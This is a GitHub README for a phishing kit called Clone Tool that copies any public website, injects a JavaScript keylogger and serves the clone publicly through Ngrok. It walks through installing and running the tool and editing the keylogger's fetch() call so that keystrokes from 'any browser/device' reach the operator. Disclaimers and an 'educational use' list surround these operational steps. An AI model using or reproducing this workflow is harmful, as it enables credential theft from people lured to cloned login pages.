# 🕵️ Clone Tool - Ethical Phishing Site Cloner

Welcome to **Clone Tool**, an educational tool for ethical hackers, cybersecurity learners, and penetration testers. This tool lets you **clone any public website**, inject a **JavaScript-based keylogger**, and serve it **locally or publicly via Ngrok** for demonstration purposes.

> ⚠️ **DISCLAIMER**
>
> This project is intended for **educational and ethical testing** ONLY. Do **not** use it to target real users, clone real login pages without permission, or for malicious purposes. The author is not responsible for any misuse.

---

## 🚀 Features

* ✅ Clone any public website
* 💉 Inject a simple JavaScript keylogger
* 🔐 Log keystrokes locally to your terminal
* 🌐 Serve on localhost (e.g., [http://127.0.0.1:7071](http://127.0.0.1:7071))
* 🌍 Share via Ngrok for external testing

---

## 🛠️ Requirements

* Python 3.x
* `wget`
* Flask (optional if using `main.py`)
* Ngrok (for public access)

---

## 📦 Installation

```bash
# Clone the repo
git clone https://github.com/Hawk3467hawkpapa/clone_tool
cd clone_tool

# (Optional) Create a virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies (if needed)
pip install flask
```

---

## 🔍 How to Use

### 1. Run the Cloner

```bash
python3 main.py
```

You will be prompted to enter a URL:

```bash
🔍 Enter target URL: https://example.com
```

The tool will:

* Clone the page into `cloned_site/`
* Inject `keylogger.js`
* Start a local web server on `http://127.0.0.1:7071`

### 2. Replace Website with Ngrok URL (For Public Access)

To allow access from outside your local network:

```bash
ngrok http 7071
```

Ngrok will generate a URL like:

```
https://78590781443e.ngrok-free.app
```

Open `cloned_site/<target_site>/keylogger.js` and change:

```js
fetch("http://localhost:7071/log", ...)
```

TO:

```js
fetch("ur URL from ngrok/log", ...)
```

Then re-run the server:

```bash
python3 server.py
```

Now, your clone is live via Ngrok and will log keystrokes from any browser/device.

---

## 🧪 Educational Use Cases

* ✅ Train users to spot phishing
* ✅ Test web defenses in your own lab
* ✅ Demonstrate JavaScript injection
* ✅ Teach web forensics / keylogging prevention

---

## 📁 File Structure

```
clone_tool/
├── main.py          # Clones the site, injects keylogger, starts local server
├── server.py        # Standalone server to host the site and log keys
├── keylogger.js     # Logs keypresses to the server
└── cloned_site/     # Where the cloned site is stored
```

---

## ✅ Best Practices

* Always have written permission before testing others' sites.
* Do NOT upload fake login pages to public sites.
* Use this tool in **isolated environments** only.
* Educate, don’t exploit.

---

## 🧠 Learn More

* [OWASP Top 10 Web Security Risks](https://owasp.org/www-project-top-ten/)
* [Ethical Hacking on TryHackMe](https://tryhackme.com/)
* [Ngrok Documentation](https://ngrok.com/docs)

---

## 👨‍💻 Author

Built by [Hawk3467hawkpapa](https://github.com/Hawk3467hawkpapa) for learning, teaching, and ethical testing.

---

> 🔐 Stay sharp. Stay ethical. Hack responsibly.
